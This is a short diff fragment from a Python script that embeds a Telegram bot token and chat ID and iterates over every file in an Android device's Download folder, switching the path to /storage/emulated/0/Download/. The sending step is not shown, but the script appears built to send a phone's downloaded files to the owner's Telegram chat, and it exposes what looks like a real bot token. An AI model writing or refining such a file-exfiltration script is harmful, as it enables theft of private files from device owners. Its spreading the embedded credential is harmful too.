@@ -8,7 +8,7 @@ RESET = "\033[0m"
 
 token = "7391314773:AAGZOyjFiaO_Ai3vJzvjYFmK2puCGOdRkig"
 chat_id = "7528720825"
-downloads_path = "/sdcard/Download/"
+downloads_path = "/storage/emulated/0/Download/"
 
 for filename in os.listdir(downloads_path):
     file_path = os.path.join(downloads_path, filename)
